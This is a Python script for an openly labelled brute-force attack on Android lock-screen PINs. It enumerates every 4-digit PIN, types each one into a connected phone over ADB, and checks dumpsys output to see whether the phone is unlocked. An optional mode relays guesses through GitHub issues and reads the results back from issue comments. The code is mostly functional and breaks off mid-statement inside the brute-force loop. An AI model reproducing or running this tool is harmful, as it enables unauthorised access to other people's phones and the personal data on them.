#!/usr/bin/env python3
import os
import sys
import time
import json
import requests
import subprocess
from datetime import datetime

class OTGUnlocker:
    def __init__(self):
        self.target_device = None
        self.api_endpoint = "https://api.github.com"
        self.session = requests.Session()
        self.attempts = 0
        self.success = False
        self.start_time = None
        self.results = []
        self.device_connected = False
        
    def setup_github_environment(self):
        """Setup environment for GitHub-based execution"""
        print("Initializing GitHub-based execution environment...")
        
        # Check if running in GitHub Actions
        if os.environ.get('GITHUB_ACTIONS') == 'true':
            print("Detected GitHub Actions environment")
            print(f"Repository: {os.environ.get('GITHUB_REPOSITORY', 'Unknown')}")
            print(f"Workflow: {os.environ.get('GITHUB_WORKFLOW', 'Unknown')}")
            return True
        
        # Check for GitHub token
        if not os.environ.get('GITHUB_TOKEN'):
            print("Warning: No GITHUB_TOKEN found. Some features may not work.")
            return False
            
        return True
    
    def check_otg_connection(self):
        """Check if a device is connected via OTG"""
        print("Checking for OTG-connected devices...")
        
        try:
            # Check for Android devices via ADB
            result = subprocess.run(['adb', 'devices'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')[1:]  # Skip first line
                for line in lines:
                    if line.strip() and 'device' in line:
                        device_id = line.split('\t')[0]
                        print(f"Found connected device: {device_id}")
                        self.target_device = device_id
                        self.device_connected = True
                        return True
                        
            # Alternative method for non-ADB devices
            result = subprocess.run(['lsusb'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Phone' in line or 'Android' in line:
                        print(f"Found potential phone device in USB list")
                        self.device_connected = True
                        return True
        except Exception as e:
            print(f"Error checking OTG connection: {str(e)}")
            
        print("No OTG-connected device found")
        return False
    
    def register_device(self, device_id):
        """Register a device for unlocking via GitHub API"""
        if not os.environ.get('GITHUB_TOKEN'):
            print("Cannot register device without GitHub token")
            return False
            
        headers = {
            "Authorization": f"token {os.environ.get('GITHUB_TOKEN')}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # Create a new issue to register the device
        data = {
            "title": f"Device Registration: {device_id}",
            "body": f"Registering device {device_id} for remote unlocking via OTG.\nTimestamp: {datetime.now().isoformat()}",
            "labels": ["device-registration", "otg-unlock"]
        }
        
        try:
            repo = os.environ.get('GITHUB_REPOSITORY', 'yourusername/yourrepo')
            response = self.session.post(
                f"{self.api_endpoint}/repos/{repo}/issues",
                headers=headers,
                json=data
            )
            
            if response.status_code == 201:
                issue_data = response.json()
                print(f"Device registered successfully. Issue ID: {issue_data['id']}")
                return issue_data['id']
            else:
                print(f"Failed to register device: {response.status_code}")
                return False
        except Exception as e:
            print(f"Error registering device: {str(e)}")
            return False
    
    def send_unlock_command(self, device_id, pin):
        """Send unlock command to device via GitHub API"""
        if not os.environ.get('GITHUB_TOKEN'):
            print("Cannot send command without GitHub token")
            return False
            
        headers = {
            "Authorization": f"token {os.environ.get('GITHUB_TOKEN')}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # Create a new issue with the unlock command
        data = {
            "title": f"Unlock Command: {device_id}",
            "body": f"Execute unlock command on device {device_id} with PIN: {pin}\nTimestamp: {datetime.now().isoformat()}",
            "labels": ["unlock-command", "otg-unlock"]
        }
        
        try:
            repo = os.environ.get('GITHUB_REPOSITORY', 'yourusername/yourrepo')
            response = self.session.post(
                f"{self.api_endpoint}/repos/{repo}/issues",
                headers=headers,
                json=data
            )
            
            if response.status_code == 201:
                issue_data = response.json()
                print(f"Unlock command sent successfully. Issue ID: {issue_data['id']}")
                return issue_data['id']
            else:
                print(f"Failed to send unlock command: {response.status_code}")
                return False
        except Exception as e:
            print(f"Error sending unlock command: {str(e)}")
            return False
    
    def check_unlock_status(self, command_id):
        """Check if unlock command was successful via GitHub API"""
        if not os.environ.get('GITHUB_TOKEN'):
            print("Cannot check status without GitHub token")
            return False
            
        headers = {
            "Authorization": f"token {os.environ.get('GITHUB_TOKEN')}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        try:
            repo = os.environ.get('GITHUB_REPOSITORY', 'yourusername/yourrepo')
            response = self.session.get(
                f"{self.api_endpoint}/repos/{repo}/issues/{command_id}/comments",
                headers=headers
            )
            
            if response.status_code == 200:
                comments = response.json()
                for comment in comments:
                    if "SUCCESS" in comment['body'].upper():
                        print(f"Unlock successful: {comment['body']}")
                        return True
                    elif "FAILED" in comment['body'].upper():
                        print(f"Unlock failed: {comment['body']}")
                        return False
                
                # No status comment found yet
                print("No status update received yet")
                return None
            else:
                print(f"Failed to check status: {response.status_code}")
                return False
        except Exception as e:
            print(f"Error checking status: {str(e)}")
            return False
    
    def try_pin_locally(self, pin):
        """Try to unlock the device locally via ADB"""
        if not self.device_connected or not self.target_device:
            return False
            
        try:
            # Send PIN using input event simulation
            cmd = f"adb -s {self.target_device} shell input text {pin}"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            # Press Enter
            subprocess.run(['adb', '-s', self.target_device, 'shell', 'input', 'keyevent', 'KEYCODE_ENTER'])
            
            # Check if unlock was successful
            time.sleep(2)  # Wait for the device to process
            
            # Check if device is unlocked
            result = subprocess.run(
                ['adb', '-s', self.target_device, 'shell', 'dumpsys', 'window'],
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                if 'mDreamingLockscreen=false' in result.stdout and 'mShowingLockscreen=false' in result.stdout:
                    return True
                    
        except Exception as e:
            print(f"Error trying PIN locally: {str(e)}")
            
        return False
    
    def brute_force_pin(self, device_id, pin_length=4, use_github=False):
        """Brute force PIN using either local ADB or GitHub API"""
        print(f"Starting brute force attack on device {device_id}")
        print(f"PIN length: {pin_length} digits")
        print(f"Using {'GitHub API' if use_github else 'local ADB'} for execution")
        
        self.start_time = time.time()
        self.attempts = 0
        
        # Generate all possible PIN combinations
        digits = '0123456789'
        
        def generate_pins(length):
            if length == 1:
                for d in digits:
                    yield d
            else:
                for prefix in generate_pins(length-1):
                    for d in digits:
                        yield prefix + d
        
        for pin in generate_pins(pin_length):
            if self.success:
                break
                
            self.attempts += 1
            print(f"Attempt #{self.attempts}: Trying PIN {pin}")
            
            if use_github:
                # Send unlock command via GitHub
                command_id = self.send_unlock_command(device_id, pin)
                if not command_id:
                    print("Failed to send unlock command")
                    continue
                
                # Wait for status update
                status = None
                max_wait = 30  # Maximum wait time in seconds
                wait_time = 0
                
                while status is None and wait_time < max_wait:
                    time.sleep(2)
                    wait_time += 2
                    status = self.check_unlock_status(command_id)
                
                if status:
                    self.success = True
                elif status is False:
                    # PIN was incorrect
                    print(f"PIN {pin}